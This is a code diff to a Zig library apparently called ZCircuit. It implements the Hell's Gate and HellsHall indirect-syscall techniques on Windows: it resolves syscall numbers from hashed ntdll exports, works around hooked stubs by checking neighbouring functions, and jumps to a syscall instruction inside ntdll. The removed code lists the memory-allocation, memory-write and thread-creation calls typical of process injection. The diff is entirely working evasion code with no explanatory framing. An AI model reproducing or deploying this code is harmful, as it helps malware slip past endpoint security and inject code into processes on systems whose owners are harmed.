@@ -4,22 +4,25 @@ const ntdll = @import("ntdll.zig");
 
 comptime {
     asm (
+        \\.intel_syntax noprefix
         \\.data
-        \\w_system_call: .long 0
+        \\  wSystemCall: .long 0
+        \\  qSyscallInsAdress: .quad 0
         \\
         \\.text
-        \\.globl hells_gate
-        \\hells_gate:
-        \\    movl $0, w_system_call(%rip)
-        \\    movl %ecx, w_system_call(%rip)
-        \\    ret
+        \\.global hells_gate
+        \\.global hell_descent
         \\
-        \\.globl hell_descent
+        \\hells_gate:
+        \\  mov dword ptr [rip + wSystemCall], ecx
+        \\  mov qword ptr [rip + qSyscallInsAdress], rdx
+        \\  ret
+        \\
         \\hell_descent:
-        \\    mov %rcx, %r10
-        \\    movl w_system_call(%rip), %eax
-        \\    syscall
-        \\    ret    
+        \\  mov r10, rcx
+        \\  mov eax, dword ptr [rip + wSystemCall]
+        \\  jmp qword ptr [rip + qSyscallInsAdress]
+        \\  ret
     );
 }
 
@@ -34,15 +37,17 @@ pub const ZCircuit = struct {
         return .{ .nt_dll = nt_dll };
     }
 
-    pub fn getSysId(self: ZCircuit, func_name_hash: u32) ?u16 {
+    pub fn getSyscall(self: ZCircuit, func_name_hash: u32) ?Syscall {
         const module_address = @intFromPtr(self.nt_dll.table_entry.DllBase);
         const pdw_address_of_functions = @as([*]u32, @ptrFromInt(module_address + self.nt_dll.export_directory.AddressOfFunctions));
         const pdw_address_of_names = @as([*]u32, @ptrFromInt(module_address + self.nt_dll.export_directory.AddressOfNames));
         const pdw_address_of_name_ordinales = @as([*]u16, @ptrFromInt(module_address + self.nt_dll.export_directory.AddressOfNameOrdinals));
+        var syscall = Syscall{ .address = 0, .ssn = 0 };
         for (0..self.nt_dll.export_directory.NumberOfNames) |cx| {
             const function_address = @as([*]u8, @ptrFromInt(module_address + pdw_address_of_functions[pdw_address_of_name_ordinales[cx]]));
             const name_ptr: [*:0]const u8 = @ptrFromInt(module_address + pdw_address_of_names[cx]);
             if (hashName(name_ptr) == func_name_hash) {
+                syscall.address = @intFromPtr(function_address);
                 // Hell's Gate
                 if (function_address[0] == 0x4c and
                     function_address[1] == 0x8b and
@@ -53,7 +58,8 @@ pub const ZCircuit = struct {
                 {
                     const low = function_address[4];
                     const high = function_address[5];
-                    return (@as(u16, high) << 8) | low;
+                    syscall.ssn = (@as(u16, high) << 8) | low;
+                    break;
                 }
 
                 // search neighboring syscall if hooked
@@ -69,7 +75,8 @@ pub const ZCircuit = struct {
                         {
                             const low = down_addr[4];
                             const high = down_addr[5];
-                            return ((@as(u16, high) << 8) | low) - @as(u16, @intCast(i));
+                            syscall.ssn = ((@as(u16, high) << 8) | low) - @as(u16, @intCast(i));
+                            break;
                         }
                         const up_addr = function_address - (i * DOWN);
                         if (up_addr[0] == 0x4c and
@@ -81,13 +88,30 @@ pub const ZCircuit = struct {
                         {
                             const low = up_addr[4];
                             const high = up_addr[5];
-                            return ((@as(u16, high) << 8) | low) + @as(u16, @intCast(i));
+                            syscall.ssn = ((@as(u16, high) << 8) | low) + @as(u16, @intCast(i));
+                            break;
                         }
                     }
                 }
             }
         }
-        return null;
+
+        if (syscall.ssn == 0) {
+            return null;
+        }
+
+        // HellsHall
+        // search for 'syscall' instruction of another syscall function
+        const start_ptr: [*]u8 = @ptrFromInt(syscall.address);
+        const search_base = start_ptr + 0xFF;
+        for (0..RANGE) |z| {
+            if (search_base[z] == 0x0f and search_base[z + 1] == 0x05) {
+                syscall.address = @intFromPtr(search_base + z);
+                break;
+            }
+        }
+
+        return syscall;
     }
 };
 
@@ -100,7 +124,7 @@ pub inline fn hashName(name: [*:0]const u8) u32 {
     return h;
 }
 
-pub fn syscall(callid: u16, args: anytype) u32 {
+pub fn do_syscall(callid: u16, syscall_addr: usize, args: anytype) u32 {
     const ArgsType = @TypeOf(args);
     const args_info = @typeInfo(ArgsType);
 
@@ -110,7 +134,7 @@ pub fn syscall(callid: u16, args: anytype) u32 {
 
     if (args.len > 11) @compileError("Too many arguments for this syscall implementation");
 
-    hells_gate(callid);
+    hells_gate(callid, syscall_addr);
     return hell_descent(
         if (args.len > 0) argToUsize(args[0]) else 0,
         if (args.len > 1) argToUsize(args[1]) else 0,
@@ -136,7 +160,7 @@ fn argToUsize(arg: anytype) usize {
         else => @as(usize, arg),
     };
 }
-extern fn hells_gate(syscall_number: u32) void;
+extern fn hells_gate(syscall_number: u32, address: usize) void;
 extern fn hell_descent(arg1: usize, arg2: usize, arg3: usize, arg4: usize, arg5: usize, arg6: usize, arg7: usize, arg8: usize, arg9: usize, arg10: usize, arg11: usize) callconv(.c) u32;
 
 pub const HANDLE = windows.HANDLE;
@@ -150,40 +174,7 @@ pub const PEB = windows.PEB;
 pub const TEB = windows.TEB;
 pub const LDR_DATA_TABLE_ENTRY = windows.LDR_DATA_TABLE_ENTRY;
 
-pub const VxTableEntry = extern struct {
-    address: ?PVOID,
-    dw_hash: u64,
-    system_call: u16,
-};
-
-pub const VxTable = extern struct {
-    NtAllocateVirtualMemory: VxTableEntry,
-    NtWriteVirtualMemory: VxTableEntry,
-    NtProtectVirtualMemory: VxTableEntry,
-    NtCreateThreadEx: VxTableEntry,
-
-    pub fn init() VxTable {
-        return VxTable{
-            .NtAllocateVirtualMemory = VxTableEntry{
-                .address = @ptrFromInt(0),
-                .dw_hash = 0x2D6D94ABE5CBF5F6,
-                .system_call = 0,
-            },
-            .NtCreateThreadEx = VxTableEntry{
-                .address = @ptrFromInt(0),
-                .dw_hash = 0xF5E50822A1E6CA7C,
-                .system_call = 0,
-            },
-            .NtProtectVirtualMemory = VxTableEntry{
-                .address = @ptrFromInt(0),
-                .dw_hash = 0x68340BF4DD70E832,
-                .system_call = 0,
-            },
-            .NtWriteVirtualMemory = VxTableEntry{
-                .address = @ptrFromInt(0),
-                .dw_hash = 0xD6BC9C637D9E5F1A,
-                .system_call = 0,
-            },
-        };
-    }
+pub const Syscall = struct {
+    address: usize,
+    ssn: u16,
 };
